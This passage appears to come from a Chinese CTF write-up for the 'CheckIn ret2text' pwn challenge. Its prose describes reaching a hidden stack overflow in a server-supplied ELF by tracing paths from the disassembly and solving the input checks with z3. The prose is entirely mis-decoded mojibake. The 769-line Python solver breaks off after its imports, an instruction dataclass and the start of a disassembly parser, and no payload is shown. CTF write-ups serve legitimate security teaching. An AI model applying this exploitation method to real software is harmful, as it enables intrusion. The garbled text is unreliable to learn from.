</span></span></code></pre></td></tr></table></div></div><h3 id=checkin-ret2text>CheckIn ret2text</h3><p>è¿æ¥ä¸Šç«¯å£å¹¶ä¸”åšäº† PoW éªŒè¯ä¹‹åï¼Œä¼šå‘é€å›æ¥ä¸€ä¸ª base64 çš„ ELFï¼Œæ‰“å¼€ä¹‹åå‘ç°æ˜¯å¾ˆå¤šè¿ç®—é€»è¾‘ï¼Œæœ€ååœ¨æŸä¸ªæ·±å¤„æœ‰ä¸€ä¸ªæ ˆæº¢å‡ºã€‚ä½†æ˜¯ä¸ºäº†è¾¾åˆ°è¿™ä¸ªæ ˆæº¢å‡ºçš„ä½ç½®ï¼Œéœ€è¦è‡ªåŠ¨é€‰æ‹©æ­£ç¡®çš„è¾“å…¥åˆ°è¾¾è¿™ä¸ªè·¯å¾„ã€‚</p><p>çœ‹èµ·æ¥éœ€è¦ â€œç¬¦å·æ‰§è¡Œâ€ æŠ€æœ¯æ¥è¾¾åˆ°è¿™æ ·çš„æ¡ä»¶ã€‚ä¸è¿‡ç”±äºå¯¹ angr ä¸å¤ªç†Ÿï¼ŒåŒæ—¶ä¹Ÿæƒ³å°è¯•ä¸€ä¸‹æ‰‹ç³™ â€œç¬¦å·æ‰§è¡Œâ€ çš„éš¾åº¦æœ‰å¤šå¤§ï¼Œè¿™é‡Œé€‰æ‹©ç›´æ¥ä½¿ç”¨ z3 æ¥åšã€‚ä¸è¿‡è¿™æ ·çš„ä»£ä»·æ˜¯ï¼Œä»£ç é‡æœ‰ç‚¹æ”¶ä¸ä½ã€‚ã€‚ä¸€é“ç®€å•çš„æ ˆæº¢å‡ºé¢˜ç›®ï¼Œå†™äº† 500 å¤šè¡Œä»£ç ï¼Œæœ‰ç‚¹è¶…å‡ºé¢„æƒ³äº†ã€‚ã€‚</p><p>ä»”ç»†è§‚å¯Ÿé¢˜ç›®å‘å›æ¥çš„ ELFï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ä»¥ä¸‹ä¸¤ä¸ªç‰¹å¾ï¼š</p><ul><li><p>è·¯å¾„å¾ˆå¤šï¼Œä½†æ˜¯å®é™…ä¸Šæ˜¯ä¸€ä¸ªäºŒå‰æ ‘ç»“æ„ï¼Œæ²¡æœ‰ç¯å½¢ï¼Œä¹Ÿæ²¡æœ‰å…¶ä»–ç»“æ„ã€‚è€Œæ¼æ´å‡½æ•°å°±åœ¨äºŒå‰æ ‘å¶å­èŠ‚ç‚¹çš„æŸä¸ªåˆ†æ”¯ã€‚</p></li><li><p>è™½ç„¶éªŒè¯ä»£ç æ¯”è¾ƒé•¿ï¼Œä½†æ˜¯æ€»å…±åªæœ‰ä¸¤ç§ï¼Œä¸€ç§æ˜¯è¾“å…¥å‡ ä¸ªæ•°å­—ï¼Œè®¡ç®—ä¸€é“æ•°å­¦é¢˜ï¼›å¦ä¸€ç§æ˜¯è¾“å…¥ä¸€æ®µå­—ç¬¦ä¸²ï¼Œç„¶ååšä¸€äº›ä½è¿ç®—ä¹‹åï¼Œä¸ä¸€ä¸ªç»“æœç›¸æ¯”è¾ƒã€‚</p></li></ul><p>å› æ­¤å¯ä»¥ç”¨ä»¥ä¸‹æ€è·¯æ¥è§£å†³ï¼š</p><ul><li><p>å…ˆæŠŠ ELF åšåæ±‡ç¼–ï¼Œç„¶åå»ºç«‹æ¯ä¸€ä¸ªæŒ‡ä»¤å’Œèƒ½è¾¾åˆ°çš„æŒ‡ä»¤çš„å…³è”ã€‚</p></li><li><p>éå†æŒ‡ä»¤ï¼Œæ‰¾åˆ°æº¢å‡ºçš„åœ°æ–¹åœ¨å“ªé‡Œã€‚</p></li><li><p>æ ¹æ®ç¬¬ä¸€æ­¥å½¢æˆçš„å…³è”ï¼Œåå‘ä¸€ç›´å¯»è·¯åˆ° main å‡½æ•°èµ·ç‚¹ï¼ˆæ¯•ç«Ÿæ²¡æœ‰ç¯è·¯ï¼‰ï¼Œå¹¶æ ‡è®°æ²¿é€”ä¸­æœ‰å¤šä¸ªå‡ºå£æŒ‡ä»¤çš„åˆ†å‰é€‰æ‹©ã€‚</p></li><li><p>æœ€åå†ä» main å‡½æ•°æ­£å‘èµ°åˆ°æ¼æ´ç‚¹ï¼Œæ ¹æ®è·¯å¾„åˆ†å‰é€‰æ‹©æ¥è®¡ç®—æ­£ç¡®çš„è¾“å…¥æ˜¯ä»€ä¹ˆã€‚å¦‚æœæ˜¯éœ€è¦åŒ¹é…çš„ï¼Œé‚£ä¹ˆç”¨ z3 è®¡ç®—å‡ºæ­£ç¡®çš„ç»“æœï¼›å¦‚æœä¸éœ€è¦åŒ¹é…çš„ï¼Œé‚£ä¹ˆéšæœºç”Ÿæˆä¸€ä¸ªè¾“å…¥å³å¯é€šè¿‡ã€‚</p></li></ul><p>æœ€ååŸºäºä¸Šè¿°æ€è·¯ï¼Œæ·»åŠ äº¿ç‚¹ç‚¹ç»†èŠ‚ï¼Œå³å¯æ‹¿åˆ° flagï¼ˆå¯èƒ½æ˜¯æœ‰å²ä»¥æ¥ä¸ºä¸€ä¸ª pwn é¢˜å†™è¿‡çš„æœ€é•¿çš„ä»£ç ï¼‰ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span><span class=lnt>213
</span><span class=lnt>214
</span><span class=lnt>215
</span><span class=lnt>216
</span><span class=lnt>217
</span><span class=lnt>218
</span><span class=lnt>219
</span><span class=lnt>220
</span><span class=lnt>221
</span><span class=lnt>222
</span><span class=lnt>223
</span><span class=lnt>224
</span><span class=lnt>225
</span><span class=lnt>226
</span><span class=lnt>227
</span><span class=lnt>228
</span><span class=lnt>229
</span><span class=lnt>230
</span><span class=lnt>231
</span><span class=lnt>232
</span><span class=lnt>233
</span><span class=lnt>234
</span><span class=lnt>235
</span><span class=lnt>236
</span><span class=lnt>237
</span><span class=lnt>238
</span><span class=lnt>239
</span><span class=lnt>240
</span><span class=lnt>241
</span><span class=lnt>242
</span><span class=lnt>243
</span><span class=lnt>244
</span><span class=lnt>245
</span><span class=lnt>246
</span><span class=lnt>247
</span><span class=lnt>248
</span><span class=lnt>249
</span><span class=lnt>250
</span><span class=lnt>251
</span><span class=lnt>252
</span><span class=lnt>253
</span><span class=lnt>254
</span><span class=lnt>255
</span><span class=lnt>256
</span><span class=lnt>257
</span><span class=lnt>258
</span><span class=lnt>259
</span><span class=lnt>260
</span><span class=lnt>261
</span><span class=lnt>262
</span><span class=lnt>263
</span><span class=lnt>264
</span><span class=lnt>265
</span><span class=lnt>266
</span><span class=lnt>267
</span><span class=lnt>268
</span><span class=lnt>269
</span><span class=lnt>270
</span><span class=lnt>271
</span><span class=lnt>272
</span><span class=lnt>273
</span><span class=lnt>274
</span><span class=lnt>275
</span><span class=lnt>276
</span><span class=lnt>277
</span><span class=lnt>278
</span><span class=lnt>279
</span><span class=lnt>280
</span><span class=lnt>281
</span><span class=lnt>282
</span><span class=lnt>283
</span><span class=lnt>284
</span><span class=lnt>285
</span><span class=lnt>286
</span><span class=lnt>287
</span><span class=lnt>288
</span><span class=lnt>289
</span><span class=lnt>290
</span><span class=lnt>291
</span><span class=lnt>292
</span><span class=lnt>293
</span><span class=lnt>294
</span><span class=lnt>295
</span><span class=lnt>296
</span><span class=lnt>297
</span><span class=lnt>298
</span><span class=lnt>299
</span><span class=lnt>300
</span><span class=lnt>301
</span><span class=lnt>302
</span><span class=lnt>303
</span><span class=lnt>304
</span><span class=lnt>305
</span><span class=lnt>306
</span><span class=lnt>307
</span><span class=lnt>308
</span><span class=lnt>309
</span><span class=lnt>310
</span><span class=lnt>311
</span><span class=lnt>312
</span><span class=lnt>313
</span><span class=lnt>314
</span><span class=lnt>315
</span><span class=lnt>316
</span><span class=lnt>317
</span><span class=lnt>318
</span><span class=lnt>319
</span><span class=lnt>320
</span><span class=lnt>321
</span><span class=lnt>322
</span><span class=lnt>323
</span><span class=lnt>324
</span><span class=lnt>325
</span><span class=lnt>326
</span><span class=lnt>327
</span><span class=lnt>328
</span><span class=lnt>329
</span><span class=lnt>330
</span><span class=lnt>331
</span><span class=lnt>332
</span><span class=lnt>333
</span><span class=lnt>334
</span><span class=lnt>335
</span><span class=lnt>336
</span><span class=lnt>337
</span><span class=lnt>338
</span><span class=lnt>339
</span><span class=lnt>340
</span><span class=lnt>341
</span><span class=lnt>342
</span><span class=lnt>343
</span><span class=lnt>344
</span><span class=lnt>345
</span><span class=lnt>346
</span><span class=lnt>347
</span><span class=lnt>348
</span><span class=lnt>349
</span><span class=lnt>350
</span><span class=lnt>351
</span><span class=lnt>352
</span><span class=lnt>353
</span><span class=lnt>354
</span><span class=lnt>355
</span><span class=lnt>356
</span><span class=lnt>357
</span><span class=lnt>358
</span><span class=lnt>359
</span><span class=lnt>360
</span><span class=lnt>361
</span><span class=lnt>362
</span><span class=lnt>363
</span><span class=lnt>364
</span><span class=lnt>365
</span><span class=lnt>366
</span><span class=lnt>367
</span><span class=lnt>368
</span><span class=lnt>369
</span><span class=lnt>370
</span><span class=lnt>371
</span><span class=lnt>372
</span><span class=lnt>373
</span><span class=lnt>374
</span><span class=lnt>375
</span><span class=lnt>376
</span><span class=lnt>377
</span><span class=lnt>378
</span><span class=lnt>379
</span><span class=lnt>380
</span><span class=lnt>381
</span><span class=lnt>382
</span><span class=lnt>383
</span><span class=lnt>384
</span><span class=lnt>385
</span><span class=lnt>386
</span><span class=lnt>387
</span><span class=lnt>388
</span><span class=lnt>389
</span><span class=lnt>390
</span><span class=lnt>391
</span><span class=lnt>392
</span><span class=lnt>393
</span><span class=lnt>394
</span><span class=lnt>395
</span><span class=lnt>396
</span><span class=lnt>397
</span><span class=lnt>398
</span><span class=lnt>399
</span><span class=lnt>400
</span><span class=lnt>401
</span><span class=lnt>402
</span><span class=lnt>403
</span><span class=lnt>404
</span><span class=lnt>405
</span><span class=lnt>406
</span><span class=lnt>407
</span><span class=lnt>408
</span><span class=lnt>409
</span><span class=lnt>410
</span><span class=lnt>411
</span><span class=lnt>412
</span><span class=lnt>413
</span><span class=lnt>414
</span><span class=lnt>415
</span><span class=lnt>416
</span><span class=lnt>417
</span><span class=lnt>418
</span><span class=lnt>419
</span><span class=lnt>420
</span><span class=lnt>421
</span><span class=lnt>422
</span><span class=lnt>423
</span><span class=lnt>424
</span><span class=lnt>425
</span><span class=lnt>426
</span><span class=lnt>427
</span><span class=lnt>428
</span><span class=lnt>429
</span><span class=lnt>430
</span><span class=lnt>431
</span><span class=lnt>432
</span><span class=lnt>433
</span><span class=lnt>434
</span><span class=lnt>435
</span><span class=lnt>436
</span><span class=lnt>437
</span><span class=lnt>438
</span><span class=lnt>439
</span><span class=lnt>440
</span><span class=lnt>441
</span><span class=lnt>442
</span><span class=lnt>443
</span><span class=lnt>444
</span><span class=lnt>445
</span><span class=lnt>446
</span><span class=lnt>447
</span><span class=lnt>448
</span><span class=lnt>449
</span><span class=lnt>450
</span><span class=lnt>451
</span><span class=lnt>452
</span><span class=lnt>453
</span><span class=lnt>454
</span><span class=lnt>455
</span><span class=lnt>456
</span><span class=lnt>457
</span><span class=lnt>458
</span><span class=lnt>459
</span><span class=lnt>460
</span><span class=lnt>461
</span><span class=lnt>462
</span><span class=lnt>463
</span><span class=lnt>464
</span><span class=lnt>465
</span><span class=lnt>466
</span><span class=lnt>467
</span><span class=lnt>468
</span><span class=lnt>469
</span><span class=lnt>470
</span><span class=lnt>471
</span><span class=lnt>472
</span><span class=lnt>473
</span><span class=lnt>474
</span><span class=lnt>475
</span><span class=lnt>476
</span><span class=lnt>477
</span><span class=lnt>478
</span><span class=lnt>479
</span><span class=lnt>480
</span><span class=lnt>481
</span><span class=lnt>482
</span><span class=lnt>483
</span><span class=lnt>484
</span><span class=lnt>485
</span><span class=lnt>486
</span><span class=lnt>487
</span><span class=lnt>488
</span><span class=lnt>489
</span><span class=lnt>490
</span><span class=lnt>491
</span><span class=lnt>492
</span><span class=lnt>493
</span><span class=lnt>494
</span><span class=lnt>495
</span><span class=lnt>496
</span><span class=lnt>497
</span><span class=lnt>498
</span><span class=lnt>499
</span><span class=lnt>500
</span><span class=lnt>501
</span><span class=lnt>502
</span><span class=lnt>503
</span><span class=lnt>504
</span><span class=lnt>505
</span><span class=lnt>506
</span><span class=lnt>507
</span><span class=lnt>508
</span><span class=lnt>509
</span><span class=lnt>510
</span><span class=lnt>511
</span><span class=lnt>512
</span><span class=lnt>513
</span><span class=lnt>514
</span><span class=lnt>515
</span><span class=lnt>516
</span><span class=lnt>517
</span><span class=lnt>518
</span><span class=lnt>519
</span><span class=lnt>520
</span><span class=lnt>521
</span><span class=lnt>522
</span><span class=lnt>523
</span><span class=lnt>524
</span><span class=lnt>525
</span><span class=lnt>526
</span><span class=lnt>527
</span><span class=lnt>528
</span><span class=lnt>529
</span><span class=lnt>530
</span><span class=lnt>531
</span><span class=lnt>532
</span><span class=lnt>533
</span><span class=lnt>534
</span><span class=lnt>535
</span><span class=lnt>536
</span><span class=lnt>537
</span><span class=lnt>538
</span><span class=lnt>539
</span><span class=lnt>540
</span><span class=lnt>541
</span><span class=lnt>542
</span><span class=lnt>543
</span><span class=lnt>544
</span><span class=lnt>545
</span><span class=lnt>546
</span><span class=lnt>547
</span><span class=lnt>548
</span><span class=lnt>549
</span><span class=lnt>550
</span><span class=lnt>551
</span><span class=lnt>552
</span><span class=lnt>553
</span><span class=lnt>554
</span><span class=lnt>555
</span><span class=lnt>556
</span><span class=lnt>557
</span><span class=lnt>558
</span><span class=lnt>559
</span><span class=lnt>560
</span><span class=lnt>561
</span><span class=lnt>562
</span><span class=lnt>563
</span><span class=lnt>564
</span><span class=lnt>565
</span><span class=lnt>566
</span><span class=lnt>567
</span><span class=lnt>568
</span><span class=lnt>569
</span><span class=lnt>570
</span><span class=lnt>571
</span><span class=lnt>572
</span><span class=lnt>573
</span><span class=lnt>574
</span><span class=lnt>575
</span><span class=lnt>576
</span><span class=lnt>577
</span><span class=lnt>578
</span><span class=lnt>579
</span><span class=lnt>580
</span><span class=lnt>581
</span><span class=lnt>582
</span><span class=lnt>583
</span><span class=lnt>584
</span><span class=lnt>585
</span><span class=lnt>586
</span><span class=lnt>587
</span><span class=lnt>588
</span><span class=lnt>589
</span><span class=lnt>590
</span><span class=lnt>591
</span><span class=lnt>592
</span><span class=lnt>593
</span><span class=lnt>594
</span><span class=lnt>595
</span><span class=lnt>596
</span><span class=lnt>597
</span><span class=lnt>598
</span><span class=lnt>599
</span><span class=lnt>600
</span><span class=lnt>601
</span><span class=lnt>602
</span><span class=lnt>603
</span><span class=lnt>604
</span><span class=lnt>605
</span><span class=lnt>606
</span><span class=lnt>607
</span><span class=lnt>608
</span><span class=lnt>609
</span><span class=lnt>610
</span><span class=lnt>611
</span><span class=lnt>612
</span><span class=lnt>613
</span><span class=lnt>614
</span><span class=lnt>615
</span><span class=lnt>616
</span><span class=lnt>617
</span><span class=lnt>618
</span><span class=lnt>619
</span><span class=lnt>620
</span><span class=lnt>621
</span><span class=lnt>622
</span><span class=lnt>623
</span><span class=lnt>624
</span><span class=lnt>625
</span><span class=lnt>626
</span><span class=lnt>627
</span><span class=lnt>628
</span><span class=lnt>629
</span><span class=lnt>630
</span><span class=lnt>631
</span><span class=lnt>632
</span><span class=lnt>633
</span><span class=lnt>634
</span><span class=lnt>635
</span><span class=lnt>636
</span><span class=lnt>637
</span><span class=lnt>638
</span><span class=lnt>639
</span><span class=lnt>640
</span><span class=lnt>641
</span><span class=lnt>642
</span><span class=lnt>643
</span><span class=lnt>644
</span><span class=lnt>645
</span><span class=lnt>646
</span><span class=lnt>647
</span><span class=lnt>648
</span><span class=lnt>649
</span><span class=lnt>650
</span><span class=lnt>651
</span><span class=lnt>652
</span><span class=lnt>653
</span><span class=lnt>654
</span><span class=lnt>655
</span><span class=lnt>656
</span><span class=lnt>657
</span><span class=lnt>658
</span><span class=lnt>659
</span><span class=lnt>660
</span><span class=lnt>661
</span><span class=lnt>662
</span><span class=lnt>663
</span><span class=lnt>664
</span><span class=lnt>665
</span><span class=lnt>666
</span><span class=lnt>667
</span><span class=lnt>668
</span><span class=lnt>669
</span><span class=lnt>670
</span><span class=lnt>671
</span><span class=lnt>672
</span><span class=lnt>673
</span><span class=lnt>674
</span><span class=lnt>675
</span><span class=lnt>676
</span><span class=lnt>677
</span><span class=lnt>678
</span><span class=lnt>679
</span><span class=lnt>680
</span><span class=lnt>681
</span><span class=lnt>682
</span><span class=lnt>683
</span><span class=lnt>684
</span><span class=lnt>685
</span><span class=lnt>686
</span><span class=lnt>687
</span><span class=lnt>688
</span><span class=lnt>689
</span><span class=lnt>690
</span><span class=lnt>691
</span><span class=lnt>692
</span><span class=lnt>693
</span><span class=lnt>694
</span><span class=lnt>695
</span><span class=lnt>696
</span><span class=lnt>697
</span><span class=lnt>698
</span><span class=lnt>699
</span><span class=lnt>700
</span><span class=lnt>701
</span><span class=lnt>702
</span><span class=lnt>703
</span><span class=lnt>704
</span><span class=lnt>705
</span><span class=lnt>706
</span><span class=lnt>707
</span><span class=lnt>708
</span><span class=lnt>709
</span><span class=lnt>710
</span><span class=lnt>711
</span><span class=lnt>712
</span><span class=lnt>713
</span><span class=lnt>714
</span><span class=lnt>715
</span><span class=lnt>716
</span><span class=lnt>717
</span><span class=lnt>718
</span><span class=lnt>719
</span><span class=lnt>720
</span><span class=lnt>721
</span><span class=lnt>722
</span><span class=lnt>723
</span><span class=lnt>724
</span><span class=lnt>725
</span><span class=lnt>726
</span><span class=lnt>727
</span><span class=lnt>728
</span><span class=lnt>729
</span><span class=lnt>730
</span><span class=lnt>731
</span><span class=lnt>732
</span><span class=lnt>733
</span><span class=lnt>734
</span><span class=lnt>735
</span><span class=lnt>736
</span><span class=lnt>737
</span><span class=lnt>738
</span><span class=lnt>739
</span><span class=lnt>740
</span><span class=lnt>741
</span><span class=lnt>742
</span><span class=lnt>743
</span><span class=lnt>744
</span><span class=lnt>745
</span><span class=lnt>746
</span><span class=lnt>747
</span><span class=lnt>748
</span><span class=lnt>749
</span><span class=lnt>750
</span><span class=lnt>751
</span><span class=lnt>752
</span><span class=lnt>753
</span><span class=lnt>754
</span><span class=lnt>755
</span><span class=lnt>756
</span><span class=lnt>757
</span><span class=lnt>758
</span><span class=lnt>759
</span><span class=lnt>760
</span><span class=lnt>761
</span><span class=lnt>762
</span><span class=lnt>763
</span><span class=lnt>764
</span><span class=lnt>765
</span><span class=lnt>766
</span><span class=lnt>767
</span><span class=lnt>768
</span><span class=lnt>769
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>typing</span> <span class=kn>import</span> <span class=n>List</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>dataclasses</span> <span class=kn>import</span> <span class=n>dataclass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>z3</span> <span class=kn>import</span> <span class=n>Solver</span><span class=p>,</span> <span class=n>BitVec</span><span class=p>,</span> <span class=n>BitVecVal</span><span class=p>,</span> <span class=n>sat</span><span class=p>,</span> <span class=n>unsat</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>zio</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@dataclass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Ins</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>index</span><span class=p>:</span> <span class=nb>int</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>addr</span><span class=p>:</span> <span class=nb>str</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>exits</span><span class=p>:</span> <span class=n>List</span><span class=p>[</span><span class=nb>str</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>opcode</span><span class=p>:</span> <span class=nb>str</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>args</span><span class=p>:</span> <span class=n>List</span><span class=p>[</span><span class=nb>str</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>choice</span><span class=p>:</span> <span class=nb>str</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__str__</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s1>&#39;</span><span class=si>%s</span><span class=s1>: </span><span class=si>%s</span><span class=s1> </span><span class=si>%s</span><span class=s1> -&gt; </span><span class=si>%s</span><span class=s1>&#39;</span> <span class=o>%</span> <span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>addr</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>opcode</span><span class=p>,</span> <span class=s1>&#39;,&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>args</span><span class=p>),</span> <span class=bp>self</span><span class=o>.</span><span class=n>exits</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>load_disasm</span><span class=p>(</span><span class=n>filepath</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>valid</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>cnt</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>instructions</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>mapping</span> <span class=o>=</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>reverse_map</span> <span class=o>=</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>line</span> <span class=ow>in</span> <span class=nb>open</span><span class=p>(</span><span class=n>filepath</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>cnt</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s1>&#39;&lt;main&gt;:&#39;</span> <span class=ow>in</span> <span class=n>line</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>valid</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=s1>&#39;&lt;_Unwind_Resume@plt&gt;&#39;</span> <span class=ow>in</span> <span class=n>line</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>valid</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>valid</span> <span class=ow>or</span> <span class=ow>not</span> <span class=n>line</span><span class=o>.</span><span class=n>strip</span><span class=p>():</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>
